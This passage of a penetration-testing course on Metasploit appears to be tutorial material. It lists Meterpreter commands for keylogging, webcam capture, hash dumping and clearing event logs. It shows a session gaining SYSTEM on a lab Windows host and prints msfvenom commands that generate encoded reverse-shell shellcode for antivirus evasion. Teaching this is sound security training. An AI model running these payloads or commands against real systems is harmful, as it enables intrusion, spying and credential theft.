    bgrun                     Executes a meterpreter <span class="hljs-keyword">script</span> <span class="hljs-keyword">as</span> a background thread
    channel                   Displays information <span class="hljs-keyword">or</span> control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding <span class="hljs-keyword">of</span> Unicode strings
    enable_unicode_encoding   Enables encoding <span class="hljs-keyword">of</span> Unicode strings
    <span class="hljs-keyword">exit</span>                      Terminate <span class="hljs-keyword">the</span> meterpreter session
    get_timeouts              Get <span class="hljs-keyword">the</span> current session <span class="hljs-keyword">timeout</span> values
    guid                      Get <span class="hljs-keyword">the</span> session GUID
    help                      Help menu
    info                      Displays information <span class="hljs-keyword">about</span> a Post module
    IRB                       Open an interactive Ruby shell <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> current session
    load                      Load one <span class="hljs-keyword">or</span> more meterpreter extensions
    machine_id                Get <span class="hljs-keyword">the</span> MSF ID <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> machine attached <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> session
    migrate                   Migrate <span class="hljs-keyword">the</span> server <span class="hljs-keyword">to</span> another process
    pivot                     Manage pivot listeners
    pry                       Open <span class="hljs-keyword">the</span> Pry debugger <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> current session
    quit                      Terminate <span class="hljs-keyword">the</span> meterpreter session
    <span class="hljs-built_in">read</span>                      Reads data <span class="hljs-keyword">from</span> a channel
    resource                  Run <span class="hljs-keyword">the</span> commands stored <span class="hljs-keyword">in</span> a <span class="hljs-built_in">file</span>
    <span class="hljs-built_in">run</span>                       Executes a meterpreter <span class="hljs-keyword">script</span> <span class="hljs-keyword">or</span> Post module
    secure                    (Re)Negotiate TLV packet encryption <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> session
    sessions                  Quickly switch <span class="hljs-keyword">to</span> another session
    set_timeouts              Set <span class="hljs-keyword">the</span> current session <span class="hljs-keyword">timeout</span> values
    sleep                     Force Meterpreter <span class="hljs-keyword">to</span> go quiet, <span class="hljs-keyword">then</span> re-establish session.
    transport                 Change <span class="hljs-keyword">the</span> current transport mechanism
    use                       Deprecated <span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> <span class="hljs-string">"load"</span>
    uuid                      Get <span class="hljs-keyword">the</span> UUID <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> current session
    <span class="hljs-built_in">write</span>                     Writes data <span class="hljs-keyword">to</span> a channel


Strap: File system Commands
============================

    Command       Description
    <span class="hljs-comment">-------       -----------</span>
    cat           Read <span class="hljs-keyword">the</span> <span class="hljs-built_in">contents</span> <span class="hljs-keyword">of</span> a <span class="hljs-built_in">file</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> screen
    cd            Change directory
    checksum      Retrieve <span class="hljs-keyword">the</span> checksum <span class="hljs-keyword">of</span> a <span class="hljs-built_in">file</span>
    cp            Copy source <span class="hljs-keyword">to</span> destination
    dir           List files (<span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> ls)
    download      Download a <span class="hljs-built_in">file</span> <span class="hljs-keyword">or</span> directory
    edit          Edit a <span class="hljs-built_in">file</span>
    getlwd        Print <span class="hljs-keyword">local</span> working directory
    getwd         Print working directory
    LCD           Change <span class="hljs-keyword">local</span> working directory
    lls           List <span class="hljs-keyword">local</span> files
    lpwd          Print <span class="hljs-keyword">local</span> working directory
    ls            List files
    mkdir         Make directory
    mv            Move source <span class="hljs-keyword">to</span> destination
    PWD           Print working directory
    rm            Delete <span class="hljs-keyword">the</span> specified <span class="hljs-built_in">file</span>
    rmdir         Remove directory
    search        Search <span class="hljs-keyword">for</span> files
    show_mount    List all mount points/logical drives
    upload        Upload a <span class="hljs-built_in">file</span> <span class="hljs-keyword">or</span> directory


Strap: Networking Commands
===========================

    Command       Description
    <span class="hljs-comment">-------       -----------</span>
    arp           Display <span class="hljs-keyword">the</span> host ARP cache
    <span class="hljs-keyword">get</span> proxy      Display <span class="hljs-keyword">the</span> current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display <span class="hljs-keyword">the</span> network connections
    portfwd       Forward a <span class="hljs-keyword">local</span> port <span class="hljs-keyword">to</span> a remote service
    resolve       Resolve a <span class="hljs-keyword">set</span> <span class="hljs-keyword">of</span> hostnames <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> target
    route         View <span class="hljs-keyword">and</span> modify <span class="hljs-keyword">the</span> routing table


Strap: System Commands
=======================

    Command       Description
    <span class="hljs-comment">-------       -----------</span>
    clearev       Clear <span class="hljs-keyword">the</span> event <span class="hljs-built_in">log</span>
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one <span class="hljs-keyword">or</span> more environment variable values
    getpid        Get <span class="hljs-keyword">the</span> current process identifier
    getprivs      Attempt <span class="hljs-keyword">to</span> enable all privileges available <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> current process
    getsid        Get <span class="hljs-keyword">the</span> SID <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> user <span class="hljs-keyword">that</span> <span class="hljs-keyword">the</span> server <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">as</span>
    getuid        Get <span class="hljs-keyword">the</span> user <span class="hljs-keyword">that</span> <span class="hljs-keyword">the</span> server <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">as</span>
    kill          Terminate a process
    localtime     Displays <span class="hljs-keyword">the</span> target system's <span class="hljs-keyword">local</span> <span class="hljs-built_in">date</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">time</span>
    pgrep         Filter processes <span class="hljs-keyword">by</span> <span class="hljs-built_in">name</span>
    pkill         Terminate processes <span class="hljs-keyword">by</span> <span class="hljs-built_in">name</span>
    ps            List <span class="hljs-built_in">running</span> processes
    reboot        Reboots <span class="hljs-keyword">the</span> remote computer
    reg           Modify <span class="hljs-keyword">and</span> interact <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> remote registry
    rev2self      Calls RevertToSelf() <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> remote machine
    shell         Drop <span class="hljs-keyword">into</span> a system command shell
    shutdown      Shuts down <span class="hljs-keyword">the</span> remote computer
    steal_token   Attempts <span class="hljs-keyword">to</span> steal an impersonation token <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> target process
    suspend       Suspends <span class="hljs-keyword">or</span> resumes a <span class="hljs-built_in">list</span> <span class="hljs-keyword">of</span> processes
    sysinfo       Gets information <span class="hljs-keyword">about</span> <span class="hljs-keyword">the</span> remote system, such <span class="hljs-keyword">as</span> OS


Strap: User interface Commands
===============================

    Command        Description
    <span class="hljs-comment">-------        -----------</span>
    enumdesktops   List all accessible desktops <span class="hljs-keyword">and</span> window stations
    getdesktop     Get <span class="hljs-keyword">the</span> current meterpreter desktop
    idle <span class="hljs-built_in">time</span>       Returns <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> seconds <span class="hljs-keyword">the</span> remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump <span class="hljs-keyword">the</span> keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch <span class="hljs-keyword">the</span> remote user's desktop <span class="hljs-keyword">in</span> <span class="hljs-built_in">real</span>-<span class="hljs-built_in">time</span>
    screenshot     Grab a screenshot <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> interactive desktop
    setdesktop     Change <span class="hljs-keyword">the</span> meterpreters current desktop
    uictl          Control <span class="hljs-keyword">some</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    <span class="hljs-comment">-------        -----------</span>
    record_mic     Record audio <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> default microphone <span class="hljs-keyword">for</span> X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> specified webcam
    webcam_stream  Play a video stream <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> specified webcam


Strap: Audio Output Commands
=============================

    Command       Description
    <span class="hljs-comment">-------       -----------</span>
    play          play a waveform audio <span class="hljs-built_in">file</span> (.wav) <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> target system


Priv: Elevate Commands
======================

    Command       Description
    <span class="hljs-comment">-------       -----------</span>
    <span class="hljs-keyword">get</span> system     Attempt <span class="hljs-keyword">to</span> elevate your privilege <span class="hljs-keyword">to</span> <span class="hljs-keyword">that</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">local</span> system.


Priv: Password database Commands
================================

    Command       Description
    <span class="hljs-comment">-------       -----------</span>
    hashdump      Dumps <span class="hljs-keyword">the</span> <span class="hljs-built_in">contents</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> SAM database


Priv: Timestamp Commands
========================

    Command       Description
    <span class="hljs-comment">-------       -----------</span>
    timestamp     Manipulate <span class="hljs-built_in">file</span> MACE attributes
</code></pre>
<p>Pretty nifty. From extracting user hashes from SAM to taking screenshots and activating webcams. All of this is done from the comfort of a Linux-style command line. Exploring further, we also see the option to open a shell channel. This will place us in the actual Windows command-line interface.</p>
<p><strong>MSF - Meterpreter Navigation</strong></p>
<p>Payloads</p>
<pre><code class="lang-shell-session">meterpreter &gt; cd Users
meterpreter &gt; ls

Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017<span class="hljs-string">-07</span><span class="hljs-string">-21</span> 06:56:23 <span class="hljs-string">+0000</span>  Administrator
40777/rwxrwxrwx   0     dir   2009<span class="hljs-string">-07</span><span class="hljs-string">-14</span> 05:08:56 <span class="hljs-string">+0000</span>  All Users
40555/r-xr-xr-x   8192  dir   2009<span class="hljs-string">-07</span><span class="hljs-string">-14</span> 03:20:08 <span class="hljs-string">+0000</span>  Default
40777/rwxrwxrwx   0     dir   2009<span class="hljs-string">-07</span><span class="hljs-string">-14</span> 05:08:56 <span class="hljs-string">+0000</span>  Default User
40555/r-xr-xr-x   4096  dir   2009<span class="hljs-string">-07</span><span class="hljs-string">-14</span> 03:20:08 <span class="hljs-string">+0000</span>  Public
100666/rw-rw-rw-  174   fil   2009<span class="hljs-string">-07</span><span class="hljs-string">-14</span> 04:54:24 <span class="hljs-string">+0000</span>  desktop.ini
40777/rwxrwxrwx   8192  dir   2017<span class="hljs-string">-07</span><span class="hljs-string">-14</span> 13:45:33 <span class="hljs-string">+0000</span>  haris


meterpreter &gt; shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users&gt;
</code></pre>
<p><code>Channel 1</code> has been created, and we are automatically placed into the CLI for this machine. The channel here represents the connection between our device and the target host, which has been established in a reverse TCP connection (from the target host to us) using a Meterpreter Stager and Stage. The stager was activated on our machine to await a connection request initialized by the Stage payload on the target machine.</p>
<p>Moving into a standard shell on the target is helpful in some cases, but Meterpreter can also navigate and perform actions on the victim machine. So we see that the commands have changed, but we have the same privilege level within the system.</p>
<p><strong>MSF - Windows CMD</strong></p>
<p>Payloads</p>
<pre><code class="lang-shell-session">Microsoft Windows [<span class="hljs-keyword">Version</span> 6.1.7601]
<span class="hljs-keyword">Copyright</span> (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users&gt;<span class="hljs-keyword">dir</span>

<span class="hljs-keyword">dir</span>
 Volume <span class="hljs-keyword">in</span> drive C has <span class="hljs-keyword">no</span> <span class="hljs-keyword">label</span>.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  07:56    &lt;<span class="hljs-keyword">DIR</span>&gt;          .
21/07/2017  07:56    &lt;<span class="hljs-keyword">DIR</span>&gt;          ..
21/07/2017  07:56    &lt;<span class="hljs-keyword">DIR</span>&gt;          Administrator
14/07/2017  14:45    &lt;<span class="hljs-keyword">DIR</span>&gt;          haris
12/04/2011  08:51    &lt;<span class="hljs-keyword">DIR</span>&gt;          Public
               0 <span class="hljs-keyword">File</span>(s)              0 bytes
               5 <span class="hljs-keyword">Dir</span>(s)  15,738,978,304 bytes free

C:\Users&gt;whoami

whoami
nt authority\system
</code></pre>
<p>Let&#39;s see what other types of payloads we can use. We will be looking at the most common ones related to Windows operating systems.</p>
<hr>
<h3 id="payload-types">Payload Types</h3>
<p>The table below contains the most common payloads used for Windows machines and their respective descriptions.</p>
<table>
<thead>
<tr>
<th><strong>Payload</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>generic/custom</code></td>
<td>Generic listener, multi-use</td>
</tr>
<tr>
<td><code>generic/shell_bind_tcp</code></td>
<td>Generic listener, multi-use, normal shell, TCP connection binding</td>
</tr>
<tr>
<td><code>generic/shell_reverse_tcp</code></td>
<td>Generic listener, multi-use, normal shell, reverse TCP connection</td>
</tr>
<tr>
<td><code>windows/x64/exec</code></td>
<td>Executes an arbitrary command (Windows x64)</td>
</tr>
<tr>
<td><code>windows/x64/loadlibrary</code></td>
<td>Loads an arbitrary x64 library path</td>
</tr>
<tr>
<td><code>windows/x64/messagebox</code></td>
<td>Spawns a dialog via MessageBox using a customizable title, text &amp; icon</td>
</tr>
<tr>
<td><code>windows/x64/shell_reverse_tcp</code></td>
<td>Normal shell, single payload, reverse TCP connection</td>
</tr>
<tr>
<td><code>windows/x64/shell/reverse_tcp</code></td>
<td>Normal shell, stager + stage, reverse TCP connection</td>
</tr>
<tr>
<td><code>windows/x64/shell/bind_ipv6_tcp</code></td>
<td>Normal shell, stager + stage, IPv6 Bind TCP stager</td>
</tr>
<tr>
<td><code>windows/x64/meterpreter/$</code></td>
<td>Meterpreter payload + varieties above</td>
</tr>
<tr>
<td><code>windows/x64/powershell/$</code></td>
<td>Interactive PowerShell sessions + varieties above</td>
</tr>
<tr>
<td><code>windows/x64/vncinject/$</code></td>
<td>VNC Server (Reflective Injection) + varieties above</td>
</tr>
</tbody>
</table>
<p>Other critical payloads that are heavily used by penetration testers during security assessments are Empire and Cobalt Strike payloads. These are not in the scope of this course, but feel free to research them in our free time as they can provide a significant amount of insight into how professional penetration testers perform their assessments on high-value targets.</p>
<p>Besides these, of course, there are a plethora of other payloads out there. Some are for specific device vendors, such as Cisco, Apple, or PLCs. Some we can generate ourselves using <code>msfvenom</code>. However, next up, we will look at <code>Encoders</code> and how they can be used to influence the attack outcome.</p>
<h2 id="encoders">Encoders</h2>
<hr>
<p>Over the 15 years of existence of the Metasploit Framework, <code>Encoders</code> have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. <code>Encoders</code> come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include:</p>
<table>
<thead>
<tr>
<th><code>x64</code></th>
<th><code>x86</code></th>
<th><code>sparc</code></th>
<th><code>ppc</code></th>
<th><code>mips</code></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>They are also needed to remove hexadecimal opcodes known as <code>bad characters</code> from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.</p>
<p>Shikata Ga Nai (<code>SGN</code>) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore. Far from it. The name (<code>仕方がない</code>) means <code>It cannot be helped</code> or <code>Nothing can be done about it</code>, and rightfully so if we were reading this a few years ago. However, there are other methodologies we will explore to evade protection systems. <a href="https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html">This article from FireEye</a> details the why and the how of Shikata Ga Nai&#39;s previous rule over the other encoders.</p>
<hr>
<h3 id="selecting-an-encoder">Selecting an Encoder</h3>
<p>Before 2015, the Metasploit Framework had different submodules that took care of payloads and encoders. They were packed separately from the msfconsole script and were called <code>msfpayload</code> and <code>msfencode</code>. These two tools are located in <code>/usr/share/framework2/</code>.</p>
<p>If we wanted to create our custom payload, we could do so through <code>msfpayload</code>, but we would have to encode it according to the target OS architecture using <code>msfencode</code> afterward. A pipe would take the output from one command and feed it into the next, which would generate an encoded payload, ready to be sent and run on the target machine.</p>
<pre><code class="lang-shell-session">[!bash!]<span class="hljs-formula">$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '<span class="hljs-tag">\<span class="hljs-name">x</span></span>00' -f perl -e x86/shikata_ga_nai

[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)

my $</span>buf = 
"<span class="hljs-tag">\<span class="hljs-name">xbe</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>7b<span class="hljs-tag">\<span class="hljs-name">xe</span></span>6<span class="hljs-tag">\<span class="hljs-name">xcd</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>7c<span class="hljs-tag">\<span class="hljs-name">xd</span></span>9<span class="hljs-tag">\<span class="hljs-name">xf</span></span>6<span class="hljs-tag">\<span class="hljs-name">xd</span></span>9<span class="hljs-tag">\<span class="hljs-name">x</span></span>74<span class="hljs-tag">\<span class="hljs-name">x</span></span>24<span class="hljs-tag">\<span class="hljs-name">xf</span></span>4<span class="hljs-tag">\<span class="hljs-name">x</span></span>58<span class="hljs-tag">\<span class="hljs-name">x</span></span>2b<span class="hljs-tag">\<span class="hljs-name">xc</span></span>9" .
"<span class="hljs-tag">\<span class="hljs-name">x</span></span>66<span class="hljs-tag">\<span class="hljs-name">xb</span></span>9<span class="hljs-tag">\<span class="hljs-name">x</span></span>92<span class="hljs-tag">\<span class="hljs-name">x</span></span>01<span class="hljs-tag">\<span class="hljs-name">x</span></span>31<span class="hljs-tag">\<span class="hljs-name">x</span></span>70<span class="hljs-tag">\<span class="hljs-name">x</span></span>17<span class="hljs-tag">\<span class="hljs-name">x</span></span>83<span class="hljs-tag">\<span class="hljs-name">xc</span></span>0<span class="hljs-tag">\<span class="hljs-name">x</span></span>04<span class="hljs-tag">\<span class="hljs-name">x</span></span>03<span class="hljs-tag">\<span class="hljs-name">x</span></span>70<span class="hljs-tag">\<span class="hljs-name">x</span></span>13<span class="hljs-tag">\<span class="hljs-name">xe</span></span>2" .
"<span class="hljs-tag">\<span class="hljs-name">x</span></span>8e<span class="hljs-tag">\<span class="hljs-name">xc</span></span>9<span class="hljs-tag">\<span class="hljs-name">xe</span></span>7<span class="hljs-tag">\<span class="hljs-name">x</span></span>76<span class="hljs-tag">\<span class="hljs-name">x</span></span>50<span class="hljs-tag">\<span class="hljs-name">x</span></span>3c<span class="hljs-tag">\<span class="hljs-name">xd</span></span>8<span class="hljs-tag">\<span class="hljs-name">xf</span></span>1<span class="hljs-tag">\<span class="hljs-name">xf</span></span>9<span class="hljs-tag">\<span class="hljs-name">x</span></span>2e<span class="hljs-tag">\<span class="hljs-name">x</span></span>7c<span class="hljs-tag">\<span class="hljs-name">x</span></span>91<span class="hljs-tag">\<span class="hljs-name">x</span></span>8e<span class="hljs-tag">\<span class="hljs-name">xdd</span></span>" .
"<span class="hljs-tag">\<span class="hljs-name">x</span></span>53<span class="hljs-tag">\<span class="hljs-name">x</span></span>1e<span class="hljs-tag">\<span class="hljs-name">x</span></span>18<span class="hljs-tag">\<span class="hljs-name">x</span></span>47<span class="hljs-tag">\<span class="hljs-name">xc</span></span>0<span class="hljs-tag">\<span class="hljs-name">x</span></span>8c<span class="hljs-tag">\<span class="hljs-name">x</span></span>87<span class="hljs-tag">\<span class="hljs-name">xf</span></span>5<span class="hljs-tag">\<span class="hljs-name">x</span></span>7d<span class="hljs-tag">\<span class="hljs-name">x</span></span>3b<span class="hljs-tag">\<span class="hljs-name">x</span></span>52<span class="hljs-tag">\<span class="hljs-name">x</span></span>88<span class="hljs-tag">\<span class="hljs-name">x</span></span>0e<span class="hljs-tag">\<span class="hljs-name">xa</span></span>6" .
"<span class="hljs-tag">\<span class="hljs-name">xc</span></span>3<span class="hljs-tag">\<span class="hljs-name">x</span></span>18<span class="hljs-tag">\<span class="hljs-name">x</span></span>92<span class="hljs-tag">\<span class="hljs-name">x</span></span>58<span class="hljs-tag">\<span class="hljs-name">xdb</span></span><span class="hljs-tag">\<span class="hljs-name">xcd</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>74<span class="hljs-tag">\<span class="hljs-name">xaa</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>2a<span class="hljs-tag">\<span class="hljs-name">x</span></span>3a<span class="hljs-tag">\<span class="hljs-name">x</span></span>55<span class="hljs-tag">\<span class="hljs-name">xae</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>35<span class="hljs-tag">\<span class="hljs-name">x</span></span>36" .
"<span class="hljs-tag">\<span class="hljs-name">xf</span></span>0<span class="hljs-tag">\<span class="hljs-name">x</span></span>5d<span class="hljs-tag">\<span class="hljs-name">xcf</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>96<span class="hljs-tag">\<span class="hljs-name">xd</span></span>0<span class="hljs-tag">\<span class="hljs-name">x</span></span>81<span class="hljs-tag">\<span class="hljs-name">xa</span></span>7<span class="hljs-tag">\<span class="hljs-name">xa</span></span>2<span class="hljs-tag">\<span class="hljs-name">x</span></span>50<span class="hljs-tag">\<span class="hljs-name">xb</span></span>2<span class="hljs-tag">\<span class="hljs-name">x</span></span>0d<span class="hljs-tag">\<span class="hljs-name">x</span></span>64<span class="hljs-tag">\<span class="hljs-name">xb</span></span>6<span class="hljs-tag">\<span class="hljs-name">x</span></span>45" .
"<span class="hljs-tag">\<span class="hljs-name">x</span></span>06<span class="hljs-tag">\<span class="hljs-name">x</span></span>0d<span class="hljs-tag">\<span class="hljs-name">xe</span></span>6<span class="hljs-tag">\<span class="hljs-name">xc</span></span>4<span class="hljs-tag">\<span class="hljs-name">x</span></span>8d<span class="hljs-tag">\<span class="hljs-name">x</span></span>85<span class="hljs-tag">\<span class="hljs-name">x</span></span>97<span class="hljs-tag">\<span class="hljs-name">x</span></span>65<span class="hljs-tag">\<span class="hljs-name">x</span></span>3d<span class="hljs-tag">\<span class="hljs-name">x</span></span>0a<span class="hljs-tag">\<span class="hljs-name">x</span></span>37<span class="hljs-tag">\<span class="hljs-name">xe</span></span>3<span class="hljs-tag">\<span class="hljs-name">xc</span></span>9<span class="hljs-tag">\<span class="hljs-name">xfc</span></span>" .
"<span class="hljs-tag">\<span class="hljs-name">xa</span></span>4<span class="hljs-tag">\<span class="hljs-name">x</span></span>9c<span class="hljs-tag">\<span class="hljs-name">x</span></span>5c<span class="hljs-tag">\<span class="hljs-name">x</span></span>0b<span class="hljs-tag">\<span class="hljs-name">x</span></span>0b<span class="hljs-tag">\<span class="hljs-name">x</span></span>49<span class="hljs-tag">\<span class="hljs-name">xbe</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>5d<span class="hljs-tag">\<span class="hljs-name">x</span></span>0e<span class="hljs-tag">\<span class="hljs-name">xdf</span></span><span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>2e<span class="hljs-tag">\<span class="hljs-name">xc</span></span>3<span class="hljs-tag">\<span class="hljs-name">x</span></span>9a" .
"<span class="hljs-tag">\<span class="hljs-name">x</span></span>3d<span class="hljs-tag">\<span class="hljs-name">xd</span></span>7<span class="hljs-tag">\<span class="hljs-name">x</span></span>82<span class="hljs-tag">\<span class="hljs-name">x</span></span>48<span class="hljs-tag">\<span class="hljs-name">x</span></span>4e<span class="hljs-tag">\<span class="hljs-name">x</span></span>72<span class="hljs-tag">\<span class="hljs-name">x</span></span>69<span class="hljs-tag">\<span class="hljs-name">xb</span></span>1<span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>34<span class="hljs-tag">\<span class="hljs-name">x</span></span>3e<span class="hljs-tag">\<span class="hljs-name">xe</span></span>2<span class="hljs-tag">\<span class="hljs-name">xa</span></span>8<span class="hljs-tag">\<span class="hljs-name">xf</span></span>9" .
"<span class="hljs-tag">\<span class="hljs-name">xf</span></span>1<span class="hljs-tag">\<span class="hljs-name">x</span></span>36<span class="hljs-tag">\<span class="hljs-name">x</span></span>67<span class="hljs-tag">\<span class="hljs-name">x</span></span>2c<span class="hljs-tag">\<span class="hljs-name">xc</span></span>2<span class="hljs-tag">\<span class="hljs-name">x</span></span>18<span class="hljs-tag">\<span class="hljs-name">xb</span></span>7<span class="hljs-tag">\<span class="hljs-name">x</span></span>1e<span class="hljs-tag">\<span class="hljs-name">x</span></span>13<span class="hljs-tag">\<span class="hljs-name">x</span></span>49<span class="hljs-tag">\<span class="hljs-name">x</span></span>97<span class="hljs-tag">\<span class="hljs-name">x</span></span>12<span class="hljs-tag">\<span class="hljs-name">x</span></span>03<span class="hljs-tag">\<span class="hljs-name">xde</span></span>" .
"<span class="hljs-tag">\<span class="hljs-name">x</span></span>85<span class="hljs-tag">\<span class="hljs-name">xfe</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>9e<span class="hljs-tag">\<span class="hljs-name">xd</span></span>4<span class="hljs-tag">\<span class="hljs-name">x</span></span>1d<span class="hljs-tag">\<span class="hljs-name">xcb</span></span><span class="hljs-tag">\<span class="hljs-name">xd</span></span>4<span class="hljs-tag">\<span class="hljs-name">x</span></span>38<span class="hljs-tag">\<span class="hljs-name">x</span></span>7d<span class="hljs-tag">\<span class="hljs-name">x</span></span>39<span class="hljs-tag">\<span class="hljs-name">x</span></span>35<span class="hljs-tag">\<span class="hljs-name">x</span></span>6b<span class="hljs-tag">\<span class="hljs-name">x</span></span>5d<span class="hljs-tag">\<span class="hljs-name">x</span></span>6f" .
"<span class="hljs-tag">\<span class="hljs-name">x</span></span>50<span class="hljs-tag">\<span class="hljs-name">x</span></span>1d<span class="hljs-tag">\<span class="hljs-name">xf</span></span>8<span class="hljs-tag">\<span class="hljs-name">xfd</span></span><span class="hljs-tag">\<span class="hljs-name">xe</span></span>9<span class="hljs-tag">\<span class="hljs-name">x</span></span>84<span class="hljs-tag">\<span class="hljs-name">x</span></span>41<span class="hljs-tag">\<span class="hljs-name">x</span></span>6d<span class="hljs-tag">\<span class="hljs-name">x</span></span>60<span class="hljs-tag">\<span class="hljs-name">x</span></span>29<span class="hljs-tag">\<span class="hljs-name">x</span></span>20<span class="hljs-tag">\<span class="hljs-name">x</span></span>12<span class="hljs-tag">\<span class="hljs-name">x</span></span>08<span class="hljs-tag">\<span class="hljs-name">xe</span></span>7" .
"<span class="hljs-tag">\<span class="hljs-name">xcf</span></span><span class="hljs-tag">\<span class="hljs-name">xa</span></span>0<span class="hljs-tag">\<span class="hljs-name">x</span></span>82<span class="hljs-tag">\<span class="hljs-name">x</span></span>6e<span class="hljs-tag">\<span class="hljs-name">x</span></span>6a<span class="hljs-tag">\<span class="hljs-name">x</span></span>3a<span class="hljs-tag">\<span class="hljs-name">x</span></span>5e<span class="hljs-tag">\<span class="hljs-name">x</span></span>44<span class="hljs-tag">\<span class="hljs-name">x</span></span>58<span class="hljs-tag">\<span class="hljs-name">x</span></span>9c<span class="hljs-tag">\<span class="hljs-name">xf</span></span>2<span class="hljs-tag">\<span class="hljs-name">xc</span></span>3<span class="hljs-tag">\<span class="hljs-name">xd</span></span>6<span class="hljs-tag">\<span class="hljs-name">xb</span></span>9" .

&lt;SNIP&gt;
</code></pre>
<p>After 2015, updates to these scripts have combined them within the <code>msfvenom</code> tool, which takes care of payload generation and Encoding. We will be talking about <code>msfvenom</code> in detail later on. Below is an example of what payload generation would look like with today&#39;s <code>msfvenom</code>:</p>
<p><strong>Generating Payload - Without Encoding</strong></p>
<pre><code class="lang-shell-session">[!bash!]<span class="hljs-formula">$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "<span class="hljs-tag">\<span class="hljs-name">x</span></span>00" -f perl

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of perl file: 1674 bytes
my $</span>buf = 
"<span class="hljs-tag">\<span class="hljs-name">xda</span></span><span class="hljs-tag">\<span class="hljs-name">xc</span></span>1<span class="hljs-tag">\<span class="hljs-name">xba</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>37<span class="hljs-tag">\<span class="hljs-name">xc</span></span>7<span class="hljs-tag">\<span class="hljs-name">xcb</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>5e<span class="hljs-tag">\<span class="hljs-name">xd</span></span>9<span class="hljs-tag">\<span class="hljs-name">x</span></span>74<span class="hljs-tag">\<span class="hljs-name">x</span></span>24<span class="hljs-tag">\<span class="hljs-name">xf</span></span>4<span class="hljs-tag">\<span class="hljs-name">x</span></span>5b<span class="hljs-tag">\<span class="hljs-name">x</span></span>2b<span class="hljs-tag">\<span class="hljs-name">xc</span></span>9" .
